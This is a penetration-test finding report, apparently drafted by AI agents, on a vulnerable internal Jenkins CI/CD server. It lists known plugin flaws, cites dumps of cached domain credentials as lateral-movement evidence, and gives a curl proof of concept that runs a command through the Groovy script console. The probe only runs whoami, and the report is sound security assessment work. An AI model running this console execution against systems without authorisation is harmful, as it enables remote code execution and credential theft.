# 🟠 Finding HIGH-006: Vulnerable Internal Jenkins CI/CD Instance
**Severity:** HIGH | **CVSS v3.1:** 8.8 (`CVSS:3.1/AV:A/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`)  
**CWE:** CWE-78 (OS Command Injection) | **OWASP:** A06:2021 — Vulnerable Components  
**Target:** Internal Jenkins CI/CD (`2.492.2`)  
**Author:** Written by Agent W | Reviewed & Approved by Agent L | Research by Agent G  

---

## 1. Summary
The organization maintains a Jenkins 2.492.2 instance with known vulnerabilities across core and plugins, including LDAP Plugin RCE (unvalidated referrals), Pipeline: Groovy 4106 unrestricted instantiation, and Script Security sandbox bypasses.

---

## 2. Technical Evidence & Proof
* **Installed Components:** Confirmed in `jenkins.txt` (Core 2.492.2, LDAP Plugin 780.vcb, Pipeline: Groovy 4106).
* **Lateral Movement Artifacts:** Windows registry cache `HKEY_LOCAL_MACHINE\SECURITY\Cache` dumps showing 10 DCC2 slots (`NL$Control = 0A000000`) in `jenkins_lateral_movement.txt`.

---

## 3. Exploitation PoC
```bash
# Groovy Script Console RCE verification probe
curl -sk -X POST "http://10.10.9.208:8080/script" \
  --data-urlencode 'script=println "whoami".execute().text'
```
